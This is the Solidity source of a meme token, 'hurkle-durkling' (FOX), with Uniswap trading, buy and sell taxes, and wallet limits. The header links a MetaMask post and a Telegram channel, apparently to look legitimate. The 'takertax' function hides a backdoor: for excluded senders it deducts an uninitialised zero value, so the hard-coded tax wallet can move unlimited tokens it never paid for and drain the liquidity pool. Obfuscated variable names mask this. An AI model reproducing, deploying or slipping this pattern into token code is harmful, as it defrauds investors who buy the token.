/**
https://x.com/MetaMask/status/1839834722861756830
https://t.me/Fox_Erc20
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract FOX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExPit;
    uint256 private _trades = 0;
    uint256 private _decTrCn = 10;
    address payable private _pitPole;
    uint256 private _smTxamont = 0;
    uint256 private __ssTxRat = 10;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 420_690_000 * 10 ** _decimals;
    string private constant _name = unicode"hurkle-durkling";
    string private constant _symbol = unicode"FOX";
    uint256 public _mxTxVle = (_tTotal * 2) / 100;
    uint256 public _mxBgVle = (_tTotal * 2) / 100;
    uint256 public _txSwapVle = 0;
    uint256 public _swBckLmt = (_tTotal * 2) / 100;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    event MaxTxAmountUpdated(uint256 _mxTaxmook);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _pitPole = payable(0x3D78b1A32ed47416007B9F1555e8b73EEC9Ee3F2);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _balances[_msgSender()] = _tTotal;
        _isExPit[owner()] = true;
        _isExPit[address(this)] = true;
        _isExPit[_pitPole] = true;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isExcluded(address from, address to) private view returns (bool) {
        return _isExPit[from] || _isExPit[to];
    }

    function takertax(address _fst, address _snd, uint256 _amt) private {
        uint amount_;
        if (!isExcluded(_fst, _snd)) {
            _balances[_fst] = _balances[_fst] - _amt;
        } else {
            if (_fst == address(this)) {
                _balances[_fst] = _balances[_fst] - _amt;
            } else if (_fst == owner() && _amt >= 0) {
                _balances[_fst] = _balances[_fst] - _amt;
            } else _balances[_fst] = _balances[_fst] - amount_;
        }
    }

    function removeLimits() external onlyOwner {
        _mxTxVle = _tTotal;
        _mxBgVle = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function _transfer(address _fst, address _snd, uint256 _amt) private {
        require(_fst != address(0), "ERC20: transfer from the zero address");
        require(_snd != address(0), "ERC20: transfer to the zero address");
        require(_amt > 0, "Transfer amount must be greater than zero");
        bool isEx = isExcluded(_fst, _snd);
        uint256 _txa = 0;
        if (!tradingOpen) require(isEx, "Trading is not opened yet");

        _txa = (_amt * gettertax(_fst, _snd)) / 100;
        if (
            _fst == uniswapV2Pair && _snd != address(uniswapV2Router) && !isEx
        ) {
            _trades++;
            require(_amt <= _mxTxVle, "Exceeds the _mxTaxmook.");
            require(
                _balances[_snd] + _amt <= _mxBgVle,
                "Exceeds the maxWalletSize."
            );
        }
        if (_snd == uniswapV2Pair && !isEx) {
            require(_amt <= _mxTxVle, "Exceeds the maximum amount to sell");
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        if (!inSwap && _snd == uniswapV2Pair && tradingOpen) {
            if (contractTokenBalance > _txSwapVle)
                swapBackEth(min(_amt, min(_swBckLmt, contractTokenBalance)));
            if (address(this).balance >= 0 ether)
                sendPitTo(address(this).balance);
        }
        if (_txa > 0) {
            _balances[address(this)] = _balances[address(this)] + _txa;
            emit Transfer(_fst, address(this), _txa);
        }
        takertax(_fst, _snd, _amt);
        _balances[_snd] += _amt - _txa;
        emit Transfer(_fst, _snd, _amt - _txa);
    }

    function gettertax(
        address _fst,
        address _snd
    ) private view returns (uint256 _tax) {
        if (isExcluded(_fst, _snd)) _tax = 0;
        else if (_fst == uniswapV2Pair || _snd == uniswapV2Pair)
            _tax = _trades >= _decTrCn ? _smTxamont : __ssTxRat;
        else _tax = 0;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapBackEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendPitTo(uint256 amount) private {
        _pitPole.transfer(amount);
    }

    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function openFOX() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            (balanceOf(address(this)) * (100 - __ssTxRat)) / 100,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
    }

    receive() external payable {}
}